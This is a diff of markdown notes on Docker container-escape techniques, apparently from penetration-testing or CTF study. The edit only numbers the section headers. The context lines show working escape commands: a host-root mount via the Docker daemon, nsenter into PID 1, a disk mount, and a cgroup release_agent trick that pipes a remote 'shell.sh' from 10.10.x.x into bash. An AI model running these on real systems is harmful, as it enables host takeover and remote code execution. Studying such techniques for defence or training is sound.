@@ -37,7 +37,7 @@ fi
 
 ## Docker Escaping Techniques
 
-### Escape via Exposed Docker Daemon
+### 1. Escape via Exposed Docker Daemon
 Run the following cmnd
 
 If we're in bash
@@ -57,7 +57,7 @@ docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
 ```
 NOTE: ubuntu:18.04 is the image repo
 
-### Shared Namespaces
+### 2. Shared Namespaces
 By using ps aux you can view the process with processID see pid 1 is running root it is the first one that executed when the system is booted.
 
 Exploiting it with nsenter
@@ -65,7 +65,7 @@ Exploiting it with nsenter
 nsenter --target 1 --mount sh
 ```
 
-### Escape By Mounting File System
+### 3. Escape By Mounting File System
 ```markdown
 lsblk
 mount /dev/sda2 /mnt
@@ -73,7 +73,7 @@ cd /mnt/root
 ```
 NOTE: In this case sda2 is the dir we mount.
 
-### Misconfigured Privileges
+### 4. Misconfigured Privileges
 list out all the capabilities
 ```markdown
 capsh --print
@@ -95,7 +95,7 @@ echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.x.x:80/shell.sh | bash
 chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
 ```
 
-### Exploitation of docker.sock in /var/run or /run if you're ROOT
+### 5. Exploitation of docker.sock in /var/run or /run if you're ROOT
 
 Check /var/run dir for docker.sock file if it's there and you're root then you can exploit it. First see that you can use curl cmd if not then wget curl from your system for static curl see the arch of target machine and get the static curl from [Resource](https://github.com/moparisthebest/static-curl)
 
